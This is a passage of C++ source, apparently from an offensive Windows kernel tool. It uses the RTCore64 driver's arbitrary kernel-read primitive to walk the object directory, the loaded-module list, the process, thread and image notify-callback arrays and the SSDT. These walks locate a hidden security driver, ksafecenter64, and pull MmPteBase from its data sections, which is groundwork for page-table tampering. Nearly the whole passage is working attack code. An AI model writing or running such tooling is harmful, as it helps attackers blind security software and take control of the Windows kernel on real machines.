        DWORD64 niVA  = hdr - niOff;
        WORD    nameLen = (WORD)(g_drv->Rd64(niVA + 0x08) & 0xFFFF);
        DWORD64 nameBuf = g_drv->Rd64(niVA + 0x10);
        if (!nameLen || nameLen > 512 || !g_drv->IsKernelVA(nameBuf)) return false;
        int nc = nameLen / 2; if (nc >= outCch) nc = outCch - 1;
        for (int ci = 0; ci < nc; ci++)
            out[ci] = (WCHAR)(g_drv->Rd64(nameBuf + ci * 2) & 0xFFFF);
        out[nc] = 0;
        return nc > 0;
    };

    auto FindObjInDir = [&](DWORD64 dir, const wchar_t* targetW, bool dumpAll) -> DWORD64 {
        DWORD64 found = 0;
        for (int b = 0; b < 37; b++) {
            DWORD64 entryPtr = g_drv->Rd64(dir + b * 8);
            while (g_drv->IsKernelVA(entryPtr)) {
                DWORD64 objBody = g_drv->Rd64(entryPtr + 0x08);
                if (g_drv->IsKernelVA(objBody)) {
                    WCHAR wn[65] = {};
                    if (ReadObjName(objBody, wn, 65)) {
                        if (dumpAll) {
                            char an[65] = {};
                            WideCharToMultiByte(CP_ACP, 0, wn, -1, an, 64, nullptr, nullptr);
                            printf("    [bucket %2d] 0x%016llX  %s\n", b, objBody, an);
                        }
                        if (_wcsicmp(wn, targetW) == 0) found = objBody;
                    }
                }
                entryPtr = g_drv->Rd64(entryPtr + 0x00);
            }
        }
        return found;
    };

    // Find \Driver directory object in root
    if (verbose) printf("  [0e] Walking root object directory...\n");
    DWORD64 driverDir = FindObjInDir(rootDir, L"Driver", verbose);
    if (!driverDir) {
        printf("  [0e] \\Driver directory not found in root (name parse failed?)\n");
        return 0;
    }
    if (verbose) printf("  [0e] \\Driver dir body @ 0x%016llX\n  Walking \\Driver entries:\n", driverDir);

    // Find ksafecenter64 in \Driver — also dump all for debugging
    DWORD64 drvObj = FindObjInDir(driverDir, L"ksafecenter64", verbose);
    if (!drvObj) {
        // Try common alternative names
        drvObj = FindObjInDir(driverDir, L"KSafeCenter", verbose);
        if (!drvObj) drvObj = FindObjInDir(driverDir, L"KSafe", verbose);
        if (!drvObj) drvObj = FindObjInDir(driverDir, L"ksafecenter", verbose);
    }
    if (!drvObj) return 0;

    // DRIVER_OBJECT.DriverStart at body+0x10
    DWORD64 driverStart = g_drv->Rd64(drvObj + 0x10);
    printf("  [0e] DRIVER_OBJECT @ 0x%016llX  DriverStart=0x%016llX\n", drvObj, driverStart);
    return g_drv->IsKernelVA(driverStart) ? driverStart : 0;
}

// ── Method 0d: Walk PsLoadedModuleList via RTCore64, find ksafecenter64 ───────
//
// ksafecenter64 hides from ZwQuerySystemInformation(SystemModuleInformation)
// (used by EnumDeviceDrivers), but may still be in PsLoadedModuleList.
// Walk the LDR doubly-linked list via kernel VAs → find DllBase for ksafecenter64
// → read its in-memory .data section → find 512GB-aligned MmPteBase copy.
//
// KLDR_DATA_TABLE_ENTRY layout (Windows 10 x64):
//   +0x00  LIST_ENTRY InLoadOrderLinks   (Flink @ +0, Blink @ +8)
//   +0x10  PVOID      ExceptionTable
//   +0x18  ULONG      ExceptionTableSize
//   +0x20  PVOID      GpValue
//   +0x28  PVOID      NonPagedDebugInfo
//   +0x30  PVOID      DllBase            ← module load VA
//   +0x38  PVOID      EntryPoint
//   +0x40  ULONG      SizeOfImage
//   +0x48  UNICODE_STRING FullDllName    (Length, MaxLength, Buffer @ +0x50)
//   +0x58  UNICODE_STRING BaseDllName    (Length, MaxLength, Buffer @ +0x60)
// ─────────────────────────────────────────────────────────────────────────────
static DWORD64 FindMmPteBaseByLdrList(bool verbose = false) {
    static const DWORD64 ALIGN_512G = (1ULL << 39) - 1;
    static const DWORD   MAX_SECSIZE = 2 * 1024 * 1024;

    // Known false-positive 512GB-aligned constants
    static const DWORD64 kFalsePos[] = {
        0xFFFF800000000000ULL, 0xFFFFFE0000000000ULL,
        0xFFFFFF0000000000ULL, 0xFFFF000000000000ULL,
        0xFFFFF80000000000ULL, 0xFFFFFFFFFFFFF000ULL,
    };
    auto IsKnownConstant = [](DWORD64 v) {
        for (auto c : kFalsePos) if (v == c) return true;
        return false;
    };

    // Resolve PsLoadedModuleList (LIST_ENTRY head)
    DWORD64 listHeadVA = KUtil::KernelExport("PsLoadedModuleList");
    if (!listHeadVA) {
        if (verbose) printf("  [0d] PsLoadedModuleList export not found\n");
        return 0;
    }
    if (verbose) printf("  [0d] PsLoadedModuleList @ 0x%016llX\n", listHeadVA);

    // Walk Flink chain
    DWORD64 flink = g_drv->Rd64(listHeadVA);
    if (!g_drv->IsKernelVA(flink)) {
        if (verbose) printf("  [0d] Flink invalid: 0x%016llX\n", flink);
        return 0;
    }

    DWORD64 result = 0;
    int guard = 0;
    int modCount = 0;
    DWORD64 ksafeBase = 0;

    for (DWORD64 entry = flink; entry != listHeadVA && guard < 1024; ++guard) {
        if (!g_drv->IsKernelVA(entry)) break;

        DWORD64 dllBase    = g_drv->Rd64(entry + 0x30);
        DWORD   sizeOfImg  = (DWORD)g_drv->Rd64(entry + 0x40) & 0xFFFFFFFF;
        WORD    nameLen    = (WORD)g_drv->Rd64(entry + 0x58);  // BaseDllName.Length
        DWORD64 nameBufVA  = g_drv->Rd64(entry + 0x60);        // BaseDllName.Buffer

        if (nameLen > 0 && nameLen <= 512 && g_drv->IsKernelVA(nameBufVA)) {
            // Read up to 32 UTF-16 chars from BaseDllName.Buffer
            WCHAR wname[33] = {};
            int nch = nameLen / 2;
            if (nch > 32) nch = 32;
            for (int i = 0; i < nch; i++) {
                WORD ch = (WORD)(g_drv->Rd64(nameBufVA + i * 2) & 0xFFFF);
                wname[i] = (WCHAR)ch;
            }
            wname[nch] = 0;

            char aname[64] = {};
            WideCharToMultiByte(CP_ACP, 0, wname, -1, aname, 63, nullptr, nullptr);
            char aLower[64]; strncpy_s(aLower, aname, 63); _strlwr_s(aLower, 64);

            if (verbose && modCount < 5)
                printf("  [0d] LDR[%3d] base=0x%016llX  %s\n", modCount, dllBase, aname);

            if (strstr(aLower, "ksafe") && g_drv->IsKernelVA(dllBase)) {
                printf("  [0d] Found ksafecenter64! DllBase=0x%016llX  size=0x%X\n",
                       dllBase, sizeOfImg);
                ksafeBase = dllBase;
                break;
            }
        }

        modCount++;
        entry = g_drv->Rd64(entry);  // Flink
    }
    if (verbose) printf("  [0d] LDR walk: %d modules seen\n", modCount);

    if (!ksafeBase) {
        if (verbose) printf("  [0d] ksafecenter64 not in PsLoadedModuleList\n");
        return 0;
    }

    // Found ksafecenter64 — open from disk, parse PE, scan in-memory .data
    WCHAR sysDrv[MAX_PATH]; GetSystemDirectoryW(sysDrv, MAX_PATH);
    WCHAR fullPath[MAX_PATH];
    swprintf_s(fullPath, MAX_PATH, L"%s\\drivers\\ksafecenter64.sys", sysDrv);

    HANDLE hf = CreateFileW(fullPath, GENERIC_READ, FILE_SHARE_READ,
                            nullptr, OPEN_EXISTING, 0, nullptr);
    if (hf == INVALID_HANDLE_VALUE) {
        printf("  [0d] Cannot open ksafecenter64.sys from disk\n");
        return 0;
    }
    DWORD fsz = GetFileSize(hf, nullptr);
    std::vector<BYTE> fbuf;
    bool loadOk = false;
    if (fsz >= 0x200 && fsz <= 32*1024*1024) {
        fbuf.resize(fsz);
        DWORD rd;
        loadOk = ReadFile(hf, fbuf.data(), fsz, &rd, nullptr) && rd == fsz;
    }
    CloseHandle(hf);
    if (!loadOk) { printf("  [0d] Read failed\n"); return 0; }

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(fbuf.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { printf("  [0d] Bad MZ\n"); return 0; }
    auto* nt  = reinterpret_cast<IMAGE_NT_HEADERS64*>(fbuf.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { printf("  [0d] Bad PE\n"); return 0; }

    auto* sec    = IMAGE_FIRST_SECTION(nt);
    WORD  numSec = nt->FileHeader.NumberOfSections;
    printf("  [0d] ksafecenter64.sys  %u sections  scanning in-memory .data...\n", numSec);

    for (WORD si = 0; si < numSec && si < 96; si++) {
        char sname[9] = {}; memcpy(sname, sec[si].Name, 8);
        DWORD chars = sec[si].Characteristics;
        DWORD rva   = sec[si].VirtualAddress;
        DWORD vsz   = sec[si].Misc.VirtualSize;
        if (!vsz) vsz = sec[si].SizeOfRawData;
        if (!vsz || vsz > MAX_SECSIZE) continue;
        if (strncmp(sname, "PAGE", 4) == 0) continue;
        if (strcmp(sname, "INIT")    == 0) continue;
        if (strcmp(sname, ".rsrc")   == 0) continue;
        if (strcmp(sname, ".reloc")  == 0) continue;
        if (chars & IMAGE_SCN_MEM_DISCARDABLE) continue;
        if (!(chars & (IMAGE_SCN_CNT_INITIALIZED_DATA |
                       IMAGE_SCN_CNT_UNINITIALIZED_DATA))) continue;

        DWORD64 secKBase = ksafeBase + rva;
        DWORD   nQWords  = vsz / 8;
        if (verbose)
            printf("    %-8s  RVA=0x%05X  sz=0x%05X  kva=0x%016llX\n",
                   sname, rva, vsz, secKBase);

        for (DWORD qi = 0; qi < nQWords; qi++) {
            DWORD64 val = g_drv->Rd64(secKBase + qi * 8);
            if (!g_drv->IsKernelVA(val)) continue;
            if (val & ALIGN_512G)         continue;
            DWORD pml4 = (DWORD)((val >> 39) & 0x1FF);
            if (pml4 < 256) continue;
            if (IsKnownConstant(val)) continue;

            printf("  [0d] ksafecenter64  %s+0x%04X = 0x%016llX  PML4[%u]  *** MmPteBase ***\n",
                   sname, qi * 8, val, pml4);
            if (!result) result = val;
        }
    }

    if (!result && verbose)
        printf("  [0d] No 512GB-aligned candidate found in ksafecenter64 sections\n");
    return result;
}

// ── Method 0e: Object directory walk → DriverStart → scan in-memory sections ─
static DWORD64 FindMmPteBaseByObjDir(bool verbose = false) {
    static const DWORD64 ALIGN_512G  = (1ULL << 39) - 1;
    static const DWORD   MAX_SECSIZE = 2 * 1024 * 1024;
    static const DWORD64 kFalsePos[] = {
        0xFFFF800000000000ULL, 0xFFFFFE0000000000ULL,
        0xFFFFFF0000000000ULL, 0xFFFF000000000000ULL,
        0xFFFFF80000000000ULL, 0xFFFFFFFFFFFFF000ULL,
    };
    auto IsKnownConstant = [](DWORD64 v) {
        for (auto c : kFalsePos) if (v == c) return true;
        return false;
    };

    DWORD64 ksafeBase = FindKsafecenterBaseByObjDir(verbose);
    if (!ksafeBase) {
        if (verbose) printf("  [0e] ksafecenter64 DRIVER_OBJECT not found in \\Driver\\\n");
        return 0;
    }

    // Open file from disk, parse PE sections
    WCHAR sysDrv[MAX_PATH]; GetSystemDirectoryW(sysDrv, MAX_PATH);
    WCHAR fullPath[MAX_PATH];
    swprintf_s(fullPath, MAX_PATH, L"%s\\drivers\\ksafecenter64.sys", sysDrv);

    HANDLE hf = CreateFileW(fullPath, GENERIC_READ, FILE_SHARE_READ,
                            nullptr, OPEN_EXISTING, 0, nullptr);
    if (hf == INVALID_HANDLE_VALUE) {
        printf("  [0e] Cannot open ksafecenter64.sys from disk\n");
        return 0;
    }
    DWORD fsz = GetFileSize(hf, nullptr);
    std::vector<BYTE> fbuf;
    bool loadOk = false;
    if (fsz >= 0x200 && fsz <= 32*1024*1024) {
        fbuf.resize(fsz);
        DWORD rd;
        loadOk = ReadFile(hf, fbuf.data(), fsz, &rd, nullptr) && rd == fsz;
    }
    CloseHandle(hf);
    if (!loadOk) { printf("  [0e] Read failed\n"); return 0; }

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(fbuf.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    auto* nt  = reinterpret_cast<IMAGE_NT_HEADERS64*>(fbuf.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    auto* sec    = IMAGE_FIRST_SECTION(nt);
    WORD  numSec = nt->FileHeader.NumberOfSections;
    if (verbose)
        printf("  [0e] ksafecenter64  DllBase=0x%016llX  %u secs\n", ksafeBase, numSec);

    DWORD64 result = 0;
    for (WORD si = 0; si < numSec && si < 96; si++) {
        char sname[9] = {}; memcpy(sname, sec[si].Name, 8);
        DWORD chars = sec[si].Characteristics;
        DWORD rva   = sec[si].VirtualAddress;
        DWORD vsz   = sec[si].Misc.VirtualSize;
        if (!vsz) vsz = sec[si].SizeOfRawData;
        if (!vsz || vsz > MAX_SECSIZE) continue;
        if (strncmp(sname, "PAGE", 4) == 0) continue;
        if (strcmp(sname, "INIT")    == 0) continue;
        if (strcmp(sname, ".rsrc")   == 0) continue;
        if (strcmp(sname, ".reloc")  == 0) continue;
        if (chars & IMAGE_SCN_MEM_DISCARDABLE) continue;
        if (!(chars & (IMAGE_SCN_CNT_INITIALIZED_DATA |
                       IMAGE_SCN_CNT_UNINITIALIZED_DATA))) continue;

        DWORD64 secKBase = ksafeBase + rva;
        DWORD   nQWords  = vsz / 8;
        if (verbose)
            printf("    %-8s  RVA=0x%05X  sz=0x%05X  kva=0x%016llX\n",
                   sname, rva, vsz, secKBase);

        for (DWORD qi = 0; qi < nQWords; qi++) {
            DWORD64 val = g_drv->Rd64(secKBase + qi * 8);
            if (!g_drv->IsKernelVA(val)) continue;
            if (val & ALIGN_512G)         continue;
            DWORD pml4 = (DWORD)((val >> 39) & 0x1FF);
            if (pml4 < 256) continue;
            if (IsKnownConstant(val)) continue;

            printf("  [0e] ksafecenter64  %s+0x%04X = 0x%016llX  PML4[%u]  *** MmPteBase ***\n",
                   sname, qi * 8, val, pml4);
            if (!result) result = val;
        }
    }
    if (!result && verbose)
        printf("  [0e] No 512GB-aligned candidate in ksafecenter64 sections\n");
    return result;
}

// ── Method 0f: kernel callback array scan → hidden driver base → MmPteBase ────
//
// Security drivers register kernel callbacks (PsSetLoadImageNotifyRoutine,
// PsSetCreateProcessNotifyRoutine, PsSetCreateThreadNotifyRoutine) that
// survive DKOM removal from PsLoadedModuleList.  The callback function
// pointers inside EX_CALLBACK_ROUTINE_BLOCK still point into hidden driver
// code — giving us an anchor address we can use to locate its DllBase.
//
// Algorithm:
//  1. Locate each notify array in ntoskrnl .data by scanning the body of the
//     corresponding exported Ps* function for a RIP-relative LEA/MOV.
//  2. Walk up to 8 / 64 EX_CALLBACK slots.  Each slot stores a tagged pointer
//     (low 4 bits = tag) to EX_CALLBACK_ROUTINE_BLOCK; Function is at +0x08.
//  3. Collect function pointers NOT in any EnumDeviceDrivers range.
//  4. For each unknown FP, scan backward (page by page) for DOS 'MZ' header.
//     Bound = min(16 MB, 2 × SizeOfImage from disk PE) to avoid unmapped pages.
//  5. Validate candidate MZ: e_lfanew in [0x40, 0x200] and points to PE sig.
//  6. Scan non-paged .data sections of the found module for 512 GB-aligned VA.
//
// Safety: backward scan stays within the driver's own mapped code pages.
//   Non-pageable code is always resident.  We cap the scan at SizeOfImage.
// ─────────────────────────────────────────────────────────────────────────────
static DWORD64 FindMmPteBaseByCallbackScan(bool verbose = false) {
    NtoskrnlImage img = LoadNtoskrnl();
    if (!img.ok) return 0;

    static const DWORD64 ALIGN_512G  = (1ULL << 39) - 1;
    static const DWORD64 kFalsePos[] = {
        0xFFFF800000000000ULL, 0xFFFFFE0000000000ULL,
        0xFFFFFF0000000000ULL, 0xFFFF000000000000ULL,
        0xFFFFF80000000000ULL, 0xFFFFFFFFFFFFF000ULL,
    };
    auto IsKnownConstant = [](DWORD64 v) {
        for (auto c : kFalsePos) if (v == c) return true;
        return false;
    };

    // Build known-module VA ranges from EnumDeviceDrivers.
    // Use conservative 32 MB upper bound per module (no GetModuleSize available).
    LPVOID devs[1024]; DWORD cb;
    if (!EnumDeviceDrivers(devs, sizeof(devs), &cb)) return 0;
    DWORD numDrv = cb / sizeof(LPVOID);
    struct KRange { DWORD64 lo, hi; };
    std::vector<KRange> known;
    known.reserve(numDrv);
    for (DWORD i = 0; i < numDrv; i++) {
        DWORD64 b = (DWORD64)devs[i];
        if (g_drv->IsKernelVA(b)) known.push_back({b, b + 32ULL*1024*1024});
    }
    auto IsKnownAddr = [&](DWORD64 va) {
        for (auto& r : known) if (va >= r.lo && va < r.hi) return true;
        return false;
    };

    const BYTE* buf = img.buf.data();

    // Helper: given the VA of a Ps* exported function, return the first
    // RIP-relative LEA/MOV target in .data found within the first 512 bytes.
    auto FindFirstDataRefInFn = [&](DWORD64 fnVA) -> DWORD64 {
        DWORD fnRVA = (DWORD)(fnVA - img.kBase);
        if (fnRVA < img.textRVA || fnRVA >= img.textRVA + img.textSz) return 0;
        DWORD fnFOA  = img.textFOA + (fnRVA - img.textRVA);
        DWORD scanE  = fnFOA + 512;
        if (scanE > img.textFOA + img.textSz) scanE = img.textFOA + img.textSz;
        for (DWORD i = fnFOA; i + 7 < scanE; i++) {
            BYTE rex = buf[i], op = buf[i+1], modrm = buf[i+2];
            if (rex != 0x48 && rex != 0x4C) continue;
            if (op != 0x8D && op != 0x8B)   continue; // LEA or MOV
            if ((modrm & 0xC7) != 0x05)     continue; // RIP-relative
            INT32 off32 = *reinterpret_cast<const INT32*>(&buf[i + 3]);
            DWORD instrRVA  = (i - img.textFOA) + img.textRVA;
            DWORD tgtRVA    = (DWORD)((INT64)instrRVA + 7 + off32);
            if (tgtRVA >= img.dataRVA && tgtRVA < img.dataEnd)
                return img.kBase + tgtRVA;
        }
        return 0;
    };

    // Helper: walk EX_CALLBACK array (nSlots entries) and return function
    // pointers that do not belong to any known driver.
    auto CollectUnknownFPs = [&](DWORD64 arrayVA, int nSlots,
                                 const char* label) -> std::vector<DWORD64> {
        std::vector<DWORD64> fps;
        for (int s = 0; s < nSlots; s++) {
            DWORD64 tagged = g_drv->Rd64(arrayVA + s * 8);
            if (!tagged) continue;
            DWORD64 blockVA = tagged & ~0xFULL;  // clear tag bits
            if (!g_drv->IsKernelVA(blockVA)) continue;
            DWORD64 fnPtr = g_drv->Rd64(blockVA + 0x08); // EX_CALLBACK_ROUTINE_BLOCK.Function
            if (!g_drv->IsKernelVA(fnPtr)) continue;
            bool known = IsKnownAddr(fnPtr);
            if (verbose)
                printf("  [0f] %s slot[%2d] block=0x%016llX fn=0x%016llX  [%s]\n",
                       label, s, blockVA, fnPtr, known ? "known" : "*** HIDDEN ***");
            if (!known) fps.push_back(fnPtr);
        }
        return fps;
    };

    std::vector<DWORD64> unknownFPs;

    // Scan each of the three Ps* notify arrays
    struct NotifyArray { const char* fnName; const char* label; int nSlots; };
    NotifyArray arrays[] = {
        { "PsSetLoadImageNotifyRoutine",     "LoadImage",  8  },
        { "PsSetCreateProcessNotifyRoutine", "CreateProc", 64 },
        { "PsSetCreateThreadNotifyRoutine",  "CreateThd",  64 },
    };
    for (auto& na : arrays) {
        DWORD64 fnVA = KUtil::KernelExport(na.fnName);
        if (!fnVA) {
            if (verbose) printf("  [0f] %s not exported\n", na.fnName);
            continue;
        }
        DWORD64 arrVA = FindFirstDataRefInFn(fnVA);
        if (!arrVA) {
            if (verbose) printf("  [0f] %s: array ref not found in fn body\n", na.fnName);
            continue;
        }
        if (verbose)
            printf("  [0f] %s array @ 0x%016llX  (%s)\n", na.fnName, arrVA, na.label);
        auto fps = CollectUnknownFPs(arrVA, na.nSlots, na.label);
        for (auto fp : fps) unknownFPs.push_back(fp);
        if (!unknownFPs.empty()) break;  // found one; stop scanning more arrays
    }

    if (unknownFPs.empty()) {
        if (verbose) printf("  [0f] No unknown callback FPs found in any notify array\n");
        return 0;
    }

    // Try to open ksafecenter64.sys from disk to get SizeOfImage (scan bound)
    WCHAR sysDrv[MAX_PATH]; GetSystemDirectoryW(sysDrv, MAX_PATH);
    WCHAR ksafePath[MAX_PATH];
    swprintf_s(ksafePath, MAX_PATH, L"%s\\drivers\\ksafecenter64.sys", sysDrv);
    std::vector<BYTE> fbuf;
    DWORD ksafeSizeOfImage = 0;
    {
        HANDLE hf = CreateFileW(ksafePath, GENERIC_READ, FILE_SHARE_READ,
                                nullptr, OPEN_EXISTING, 0, nullptr);
        if (hf != INVALID_HANDLE_VALUE) {
            DWORD fsz = GetFileSize(hf, nullptr);
            if (fsz >= 0x200 && fsz <= 32*1024*1024) {
                fbuf.resize(fsz);
                DWORD rd;
                if (ReadFile(hf, fbuf.data(), fsz, &rd, nullptr) && rd == fsz) {
                    auto* dos2 = reinterpret_cast<IMAGE_DOS_HEADER*>(fbuf.data());
                    if (dos2->e_magic == IMAGE_DOS_SIGNATURE) {
                        auto* nt2 = reinterpret_cast<IMAGE_NT_HEADERS64*>(
                                        fbuf.data() + dos2->e_lfanew);
                        if (nt2->Signature == IMAGE_NT_SIGNATURE)
                            ksafeSizeOfImage = nt2->OptionalHeader.SizeOfImage;
                    }
                }
            }
            CloseHandle(hf);
        }
        if (verbose)
            printf("  [0f] ksafecenter64.sys disk: %s  SizeOfImage=0x%X\n",
                   ksafeSizeOfImage ? "loaded" : "NOT FOUND", ksafeSizeOfImage);
    }

    // Scan backward from each unknown FP to find MZ header → ksafeBase
    DWORD64 backBound = ksafeSizeOfImage ? (DWORD64)ksafeSizeOfImage * 2
                                          : 16ULL * 1024 * 1024;

    DWORD64 result = 0;
    std::set<DWORD64> triedBases;

    for (DWORD64 fp : unknownFPs) {
        if (verbose) printf("  [0f] Scanning backward from 0x%016llX (bound=0x%llX)\n",
                            fp, backBound);
        DWORD64 searchFrom = fp & ~0xFFFULL;  // align to page
        DWORD64 ksafeBase  = 0;

        for (DWORD64 dist = 0; dist <= backBound; dist += 0x1000) {
            if (dist > searchFrom) break;  // underflow guard
            DWORD64 probe = searchFrom - dist;
            if (!g_drv->IsKernelVA(probe)) break;
            if (!IsVaMapped(probe)) continue;  // skip non-present pages — RTCore64 has no SEH
            WORD mz = (WORD)(g_drv->Rd64(probe) & 0xFFFF);
            if (mz == 0x5A4D) {  // DOS 'MZ'
                WORD e_lfanew = (WORD)((g_drv->Rd64(probe + 0x3C)) & 0xFFFF);
                if (e_lfanew >= 0x40 && e_lfanew <= 0x400) {
                    DWORD peSig = (DWORD)(g_drv->Rd64(probe + e_lfanew) & 0xFFFFFFFF);
                    if (peSig == 0x00004550) {  // 'PE\0\0'
                        ksafeBase = probe;
                        if (verbose)
                            printf("  [0f] MZ+PE validated at 0x%016llX  (fp-0x%llX back)\n",
                                   probe, dist);
                        break;
                    }
                }
            }
        }

        if (!ksafeBase || triedBases.count(ksafeBase)) continue;
        triedBases.insert(ksafeBase);
        printf("  [0f] Hidden driver base = 0x%016llX\n", ksafeBase);

        // Scan .data sections for 512GB-aligned MmPteBase candidate.
        // Prefer disk PE layout; fall back to raw QWORD scan.
        bool hasPE = !fbuf.empty();
        if (hasPE) {
            auto* dos2 = reinterpret_cast<IMAGE_DOS_HEADER*>(fbuf.data());
            auto* nt2  = reinterpret_cast<IMAGE_NT_HEADERS64*>(fbuf.data() + dos2->e_lfanew);
            auto* sec2 = IMAGE_FIRST_SECTION(nt2);
            WORD  ns2  = nt2->FileHeader.NumberOfSections;
            for (WORD si = 0; si < ns2 && si < 96; si++) {
                char sn[9] = {}; memcpy(sn, sec2[si].Name, 8);
                DWORD ch  = sec2[si].Characteristics;
                DWORD rva = sec2[si].VirtualAddress;
                DWORD vsz = sec2[si].Misc.VirtualSize;
                if (!vsz) vsz = sec2[si].SizeOfRawData;
                if (!vsz || vsz > 2*1024*1024) continue;
                if (strncmp(sn, "PAGE", 4) == 0) continue;
                if (strcmp(sn, "INIT") == 0) continue;
                if (strcmp(sn, ".rsrc") == 0 || strcmp(sn, ".reloc") == 0) continue;
                if (ch & IMAGE_SCN_MEM_DISCARDABLE) continue;
                if (!(ch & (IMAGE_SCN_CNT_INITIALIZED_DATA |
                             IMAGE_SCN_CNT_UNINITIALIZED_DATA))) continue;
                DWORD64 secBase = ksafeBase + rva;
                DWORD   nQ      = vsz / 8;
                if (verbose) printf("    scan %-8s  kva=0x%016llX  sz=0x%X\n", sn, secBase, vsz);
                for (DWORD qi = 0; qi < nQ; qi++) {
                    DWORD64 val = g_drv->Rd64(secBase + qi * 8);
                    if (!g_drv->IsKernelVA(val)) continue;
                    if (val & ALIGN_512G) continue;
                    DWORD pml4 = (DWORD)((val >> 39) & 0x1FF);
                    if (pml4 < 256) continue;
                    if (IsKnownConstant(val)) continue;
                    printf("  [0f] %s+0x%04X = 0x%016llX  PML4[%u]  *** MmPteBase ***\n",
                           sn, qi*8, val, pml4);
                    if (!result) result = val;
                }
            }
        } else {
            // No disk PE — raw QWORD scan of SizeOfImage bytes at ksafeBase
            DWORD scanSz = ksafeSizeOfImage ? ksafeSizeOfImage : 0x80000;
            if (verbose) printf("    raw scan 0x%X bytes from 0x%016llX\n", scanSz, ksafeBase);
            for (DWORD qi = 0; qi < scanSz / 8; qi++) {
                DWORD64 val = g_drv->Rd64(ksafeBase + qi * 8);
                if (!g_drv->IsKernelVA(val)) continue;
                if (val & ALIGN_512G) continue;
                DWORD pml4 = (DWORD)((val >> 39) & 0x1FF);
                if (pml4 < 256) continue;
                if (IsKnownConstant(val)) continue;
                printf("  [0f] raw+0x%04X = 0x%016llX  PML4[%u]  *** MmPteBase ***\n",
                       qi*8, val, pml4);
                if (!result) result = val;
            }
        }
        if (result) break;
    }
    return result;
}

// ── Method 0g: SSDT hook scan → hooked fn VA → hidden driver base → MmPteBase ─
//
// ksafecenter64 hooks NtQuerySystemInformation (and possibly other syscalls)
// to hide itself from ZwQuerySystemInformation(SystemModuleInformation).
// The SSDT (KiServiceTable) stores 32-bit signed offsets from its own base:
//   fnVA = (DWORD64)KiServiceTable + (INT32)(entry >> 4)
// A hooked entry's fnVA falls OUTSIDE all known driver ranges.
//
// KeServiceDescriptorTable is exported; +0x00 = KiServiceTable base (PVOID),
// +0x10 = NumberOfServices (ULONG).
// ─────────────────────────────────────────────────────────────────────────────
static DWORD64 FindMmPteBaseBySSdtScan(bool verbose = false) {
    static const DWORD64 ALIGN_512G  = (1ULL << 39) - 1;
    static const DWORD64 kFalsePos[] = {
        0xFFFF800000000000ULL, 0xFFFFFE0000000000ULL,
        0xFFFFFF0000000000ULL, 0xFFFF000000000000ULL,
        0xFFFFF80000000000ULL, 0xFFFFFFFFFFFFF000ULL,
    };
    auto IsKnownConstant = [](DWORD64 v) {
        for (auto c : kFalsePos) if (v == c) return true;
        return false;
    };

    // Known module ranges from EnumDeviceDrivers
    LPVOID devs[1024]; DWORD cb;
    if (!EnumDeviceDrivers(devs, sizeof(devs), &cb)) return 0;
    DWORD numDrv = cb / sizeof(LPVOID);
    struct KRange { DWORD64 lo, hi; };
    std::vector<KRange> known;
    known.reserve(numDrv);
    for (DWORD i = 0; i < numDrv; i++) {
        DWORD64 b = (DWORD64)devs[i];
        if (g_drv->IsKernelVA(b)) known.push_back({b, b + 32ULL*1024*1024});
    }
    auto IsKnownAddr = [&](DWORD64 va) {
        for (auto& r : known) if (va >= r.lo && va < r.hi) return true;
        return false;
    };

    // Locate KSERVICE_TABLE_DESCRIPTOR
    DWORD64 ksdtVA = KUtil::KernelExport("KeServiceDescriptorTable");
    if (!ksdtVA) {
        if (verbose) printf("  [0g] KeServiceDescriptorTable not exported\n");
        return 0;
    }
    DWORD64 kiServiceTable = g_drv->Rd64(ksdtVA + 0x00);   // ServiceTableBase
    DWORD   nServices      = (DWORD)g_drv->Rd64(ksdtVA + 0x10) & 0xFFFF;
    if (!g_drv->IsKernelVA(kiServiceTable) || nServices == 0 || nServices > 1024) {
        if (verbose)
            printf("  [0g] KiServiceTable=0x%016llX nServices=%u  (invalid)\n",
                   kiServiceTable, nServices);
        return 0;
    }
    if (verbose)
        printf("  [0g] KeServiceDescriptorTable @ 0x%016llX\n"
               "       KiServiceTable=0x%016llX  nServices=%u\n",
               ksdtVA, kiServiceTable, nServices);

    // ntoskrnl range: [kBase, kBase + 32MB) — hooked entries point OUTSIDE this
    LPVOID kd[1]; DWORD kcb;
    if (!EnumDeviceDrivers(kd, sizeof(kd), &kcb)) return 0;
    DWORD64 kBase = (DWORD64)kd[0];

    std::vector<DWORD64> unknownFPs;
    for (DWORD i = 0; i < nServices; i++) {
        DWORD entryVA = (DWORD)(kiServiceTable + i * 4);  // 32-bit read
        DWORD raw     = g_drv->Rd32(kiServiceTable + i * 4);
        // Decode: fnVA = KiServiceTable + (INT32)raw >> 4
        INT32 off4    = (INT32)raw >> 4;   // arithmetic right-shift = signed divide by 16
        // But wait: raw is the actual offset*16 | argCount, so raw >> 4 = offset
        // The offset is from KiServiceTable itself
        DWORD64 fnVA = kiServiceTable + (INT64)off4;

        if (!g_drv->IsKernelVA(fnVA)) continue;
        if (IsKnownAddr(fnVA)) continue;  // in a known module

        if (verbose)
            printf("  [0g] SSDT[%3u] raw=0x%08X  fn=0x%016llX  *** OUTSIDE known modules ***\n",
                   i, raw, fnVA);
        unknownFPs.push_back(fnVA);
    }

    if (unknownFPs.empty()) {
        if (verbose) printf("  [0g] No out-of-range SSDT entries\n");
        return 0;
    }

    // Try to get SizeOfImage from disk for safe backward scan
    WCHAR sysDrv[MAX_PATH]; GetSystemDirectoryW(sysDrv, MAX_PATH);
    WCHAR ksafePath[MAX_PATH];
    swprintf_s(ksafePath, MAX_PATH, L"%s\\drivers\\ksafecenter64.sys", sysDrv);
    std::vector<BYTE> fbuf;
    DWORD ksafeSizeOfImage = 0;
    {
        HANDLE hf = CreateFileW(ksafePath, GENERIC_READ, FILE_SHARE_READ,
                                nullptr, OPEN_EXISTING, 0, nullptr);
        if (hf != INVALID_HANDLE_VALUE) {
            DWORD fsz = GetFileSize(hf, nullptr);
            if (fsz >= 0x200 && fsz <= 32*1024*1024) {
                fbuf.resize(fsz);
                DWORD rd;
                if (ReadFile(hf, fbuf.data(), fsz, &rd, nullptr) && rd == fsz) {
                    auto* dos2 = reinterpret_cast<IMAGE_DOS_HEADER*>(fbuf.data());
                    if (dos2->e_magic == IMAGE_DOS_SIGNATURE) {
